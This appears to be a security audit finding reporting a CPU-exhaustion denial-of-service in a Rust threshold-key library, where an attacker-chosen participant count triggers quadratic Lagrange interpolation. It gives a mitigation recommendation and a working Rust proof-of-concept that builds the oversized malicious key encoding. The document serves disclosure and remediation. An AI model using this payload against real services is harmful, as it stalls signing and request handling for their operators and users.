### Title
Attacker-controlled threshold size causes quadratic Lagrange evaluation and CPU exhaustion - ([File: `crypto/dkg/src/lib.rs`](crypto/dkg/src/lib.rs))

### Summary
`ThresholdKeys::read` accepts an attacker-controlled `n`/`t` up to `u16::MAX` and passes them to `ThresholdKeys::new` after deserializing `n` verification shares. For Lagrange interpolation, `ThresholdKeys::new` evaluates one interpolation factor for each of the `t` initial participants, while each factor iterates over all `t` participants, producing `O(t²)` scalar work plus `t` inversions and point multiplications. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`ThresholdParams::new` permits any nonzero `t <= n` and `i <= n`, so a serialized key can specify `t = n = 65,535`. `ThresholdKeys::read` then reads that many group elements and invokes `ThresholdKeys::new`. [4](#0-3) [5](#0-4) 

`ThresholdKeys::new` constructs `included = 1..=t` and calls `interpolation_factor` for every participant in that list. [2](#0-1)  Under `Interpolation::Lagrange`, each call loops over every included participant and performs two scalar multiplications per non-self participant, followed by a scalar inversion. [6](#0-5)  At `t = 65,535`, this amounts to approximately 4.29 billion loop iterations, roughly 8.6 billion scalar multiplications, 65,535 inversions, and 65,535 scalar-point multiplications in one synchronous call. [7](#0-6) [2](#0-1) 

### Impact Explanation
A small serialized key of only a few megabytes can make the receiving thread perform billions of field operations without yielding or enforcing an application-level participant limit. This is the same availability bug class as the Xen report: a nominally bounded operation contains an expensive non-preemptable computation whose cost is controlled by untrusted input. [1](#0-0) [3](#0-2) 

Any service that accepts serialized `ThresholdKeys` from an unprivileged source can be stalled long enough to interrupt signing, key loading, recovery, or request handling. Repeated submissions can keep workers occupied continuously. The issue does not require malformed point encodings because repeated valid generator encodings are sufficient. [8](#0-7) 

### Likelihood Explanation
The dangerous parameters are entirely attacker-controlled and require no malformed participants, duplicates, or private data. The maximum payload is small relative to modern network limits, while the resulting computation is quadratic in `t` and reaches billions of operations. [9](#0-8) [3](#0-2) 

The exploit requires a reachable caller that passes untrusted bytes to `ThresholdKeys::read`; stored keys generated locally are not an attack path. Where the API is used on externally supplied key material, a single request is sufficient to trigger the expensive path before any semantic relationship between the supplied shares is checked. [10](#0-9) 

### Recommendation
Enforce a protocol-appropriate maximum for `n` and `t` before deserializing the verification-share vector or invoking `ThresholdKeys::new`. [11](#0-10) 

Also avoid the quadratic Lagrange construction by deriving all coefficients with an aggregated denominator/product algorithm, and perform key-material parsing on bounded or cancellable work queues where untrusted input is expected. Reject inputs whose declared threshold exceeds the configured operational validator-set size rather than supporting the full `u16` range. [3](#0-2) [2](#0-1) 

### Proof of Concept
The following input shape is sufficient. It declares `t = n = u16::MAX`, selects Lagrange interpolation, supplies a canonical scalar, and repeats a valid generator encoding for every participant:

```rust
use zeroize::Zeroizing;
use ciphersuite::{
  group::{ff::PrimeField, GroupEncoding},
  Ciphersuite,
};
use frost::ThresholdKeys;

fn malicious_threshold_keys<C: Ciphersuite>() -> Vec<u8> {
  const N: u16 = u16::MAX;

  let mut buf = Vec::new();
  buf.extend(u32::try_from(C::ID.len()).unwrap().to_le_bytes());
  buf.extend(C::ID);

  buf.extend(N.to_le_bytes()); // t
  buf.extend(N.to_le_bytes()); // n
  buf.extend(1u16.to_le_bytes()); // i

  buf.push(1); // Interpolation::Lagrange
  buf.extend(C::F::ONE.to_repr().as_ref()); // secret share

  let generator = C::generator().to_bytes();
  for _ in 0..N {
    buf.extend(generator.as_ref()); // verification share
  }

  buf
}

fn trigger<C: Ciphersuite>() {
  let encoded = malicious_threshold_keys::<C>();
  let mut reader = encoded.as_slice();

  // This performs ~4.29 billion Lagrange loop iterations before returning.
  let _ = ThresholdKeys::<C>::read(&mut reader);
}
```

`ThresholdKeys::read` accepts the declared dimensions, deserializes the 65,535 points, and calls `ThresholdKeys::new`; `ThresholdKeys::new` then performs the quadratic Lagrange evaluation. [1](#0-0) [2](#0-1)

impl<F: Zeroize + PrimeField> Interpolation<F> {
  /// The interpolation factor for this participant, within this signing set.
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
